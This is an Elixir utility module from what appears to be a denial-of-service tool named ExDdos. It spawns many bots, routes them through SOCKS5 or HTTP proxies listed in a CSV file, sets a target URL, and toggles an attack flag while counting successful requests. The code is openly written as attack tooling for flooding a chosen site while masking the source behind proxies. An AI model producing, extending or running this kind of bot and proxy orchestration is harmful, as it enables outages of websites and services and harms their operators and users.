defmodule ExDdos.Utils do
  alias NimbleCSV.RFC4180, as: CSV

  def start_num_of_bots(count) do
    for _ <- 1..count, do: Task.start(fn -> ExDdos.BotSupervisor.start_child([]) end)
  end

  def start_bots_with_proxy do
    "./proxies.csv"
    |> File.stream!()
    |> CSV.parse_stream()
    |> Stream.each(fn [scheme, host, port] ->
      if scheme in ["socks5", "http", "https"] do
        ExDdos.BotSupervisor.start_child(
          scheme: scheme,
          host: String.to_charlist(host),
          port: String.to_integer(port)
        )
      end
    end)
    |> Stream.run()
  end

  def set_target(url), do: Cachex.put(:config_store, "url", url)

  def start_attack, do: Cachex.put(:config_store, "attack?", true)

  def stop_attack, do: Cachex.put(:config_store, "attack?", false)

  def success_req_count, do: Cachex.get!(:counts, "success_req_count")

  def bot_count, do: ExDdos.BotSupervisor.child_count()
end
